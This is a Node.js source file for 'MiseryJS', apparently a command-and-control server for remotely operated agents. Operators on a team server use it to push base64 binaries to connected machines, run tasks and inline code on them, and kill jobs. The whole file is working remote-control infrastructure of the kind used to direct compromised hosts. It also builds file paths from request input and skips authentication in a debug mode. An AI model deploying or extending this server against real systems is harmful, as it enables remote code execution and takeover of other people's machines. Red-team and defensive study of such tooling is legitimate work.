const express = require('express');
require('dotenv').config();
const app = express();
const teamApp = express();
const listener = require('http').Server(app);
const team = require('http').Server(teamApp);
const controllers = require('socket.io')(team, {
  maxHttpBufferSize: 1e8
});
const clients = require('socket.io')(listener, {
  maxHttpBufferSize: 1e8
});
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

var extensions = findFiles('agent/modules', 'server-extension.js').map(file => require('./' + file));

teamApp.use(express.static(__dirname + '/public'));

teamApp.get('/module-scripts', (req, res) => {
  res.status(200).send(findFiles('agent/modules', 'return-types.js'));
});

teamApp.get('/*/return-types.js', (req, res) => {
  res.sendFile(__dirname + req.originalUrl.replace(/\?_=\d*/g, ''));
});

teamApp.get('/commands.json', (req, res) => {
  var commandFiles = findFiles('agent/modules', 'commands.json');
  var commands = JSON.parse(fs.readFileSync('commands.json'));
  commandFiles.forEach(f => {
    commands = {
      ...commands,
      ...JSON.parse(fs.readFileSync(f))
    };
  });

  res.status(200).send(commands);
});

var id = uuidv4();

var customers = [];

controllers.on('connection', (socket) => {
  if(process.env.DEBUG != "TRUE" && socket.handshake.auth.token != id){
    socket.emit('invalid-login');
    socket.disconnect(true);
    return;
  }

  extensions.forEach(x => {
    if(x.onControllerConnection){
      x.onControllerConnection({customers, clients, socket, controllers});
    }
  });

  controllers.emit('connections', customers);

  socket.on('echo', msg => {
    var cust = customers.find(c => c.id == msg.id);
    if(cust){
      clients.to(cust.socketId).emit("echo", msg.message);
    }
  });

  socket.on('exit', msg => {
    var cust = customers.find(c => c.id == msg.id);
    if(cust){
      clients.to(cust.socketId).emit("exit");
    }
  });

  socket.on('list-jobs', msg => {
    var cust = customers.find(c => c.id == msg.id);
    if(cust){
      clients.to(cust.socketId).emit("list-jobs");
    }
  });

  socket.on('kill-job', msg => {
    var cust = customers.find(c => c.id == msg.id);
    if(cust){
      clients.to(cust.socketId).emit("kill-job", msg.args);
    }
  });

  socket.on('load', msg => {
    var cust = customers.find(c => c.id == msg.id);

    if(cust){
      if(fs.existsSync(`./${msg.fileName}`)){
        
        var binary = fs.readFileSync(`./${msg.fileName}`).toString('base64');
        clients.to(cust.socketId).emit("load", binary);
        console.log("Loaded: " + msg.fileName);
      }else{
        socket.emit('echo', 'File does not exist');
      }
    }else{
      socket.emit('echo', 'Invalid client');
    }
  });

  socket.on('run-task', msg => {
    var cust = customers.find(c => c.id == msg.id);

    if(cust){
      clients.to(cust.socketId).emit("run-task", msg.args);
      console.log("Ran: " + msg.args.filter(a => a.toString().length < 100));
    }else{
      socket.emit('echo', 'Invalid client');
    }
  });

  socket.on('run-inline', msg => {
    var cust = customers.find(c => c.id == msg.id);

    if(cust){
      clients.to(cust.socketId).emit("run-inline", msg.args);
      console.log("Run-inline: " + msg.args);
    }else{
      socket.emit('echo', 'Invalid client');
    }
  });

  socket.on('run-stream', msg => {
    var cust = customers.find(c => c.id == msg.id);

    if(cust){
      clients.to(cust.socketId).emit("run-stream", msg.args);
      console.log("Ran: " + msg.args);
    }else{
      socket.emit('echo', 'Invalid client');
    }
  });

  socket.on('run-server-extension', msg => {
    extensions.forEach(x => {
      if(x.listeners){
        var extMethod = x.listeners.find(l => l.name == msg.name);
        if(extMethod){
          extMethod.handle({customers, clients, socket, controllers}, msg);
        }
      }
    })
  });
});

clients.on('connection', (socket) => {
  console.log("new connection: " + socket.id);

  let startTime;

  setInterval(() => {
    startTime = Date.now();
    socket.emit('ping');
  }, 1000);

  socket.on('pong', () => {
    var latency = Date.now() - startTime;
    
    var cust = customers.find(c => c.socketId == socket.id);
    if(cust){
      cust.latency = latency + 'ms';
      controllers.emit('connections', customers);
    }
  });

  socket.on('register', msg => {
    msg.socketId = socket.id;
    msg.latency = 'Unknown';
    customers.push(msg);
    controllers.emit('connections', customers);
  });

  socket.on('disconnect', () => {
    console.log(socket.id + " disconnected");
    customers = customers.filter(c => c.socketId != socket.id);
    controllers.emit('connections', customers);
  });

  socket.on('echo', msg => {
    if(msg.returnType == 3){
      customers.find(c => c.socketId == socket.id).pwd = msg.output;
      controllers.emit('connections', customers);
    }

    if(extensions.every(x => 
        !x.handlers || x.handlers
        .filter(h => h.returnType == msg.returnType)
        .every(h => h.handle({customers, clients, socket, controllers}, msg))
      )){

      if(msg.output) {
        fs.writeFileSync("logs/console.log", msg.output.toString(), {flag:'a+'}); // log output to log file
      }
        
      controllers.emit('echo', msg);
    }
  });

});

console.log(require('figlet').textSync('MiseryJS'));
var listenerPort = process.argv[3] ?? process.env.LISTENER_PORT ?? 8888;
var teamPort = process.argv[2] ?? process.env.TEAM_PORT ?? 3000;
listener.listen(listenerPort, console.log(`Listener server running at http://localhost:${listenerPort}/`));
team.listen(teamPort, console.log(`Team server running at http://localhost:${teamPort}/`));
console.log("The super secret password is " + id);

function findFiles(startPath,filter){

  var results = [];

  var files = fs.readdirSync(startPath);
  for(var i = 0; i < files.length; i++){
      var filename = path.join(startPath, files[i]);
      var stat = fs.lstatSync(filename);
      if (stat.isDirectory()){
          results = results.concat(findFiles(filename, filter)); //recurse
      }else if (filename.indexOf(filter)>=0) {
          results.push(filename);
      }
  }
  return results;
}
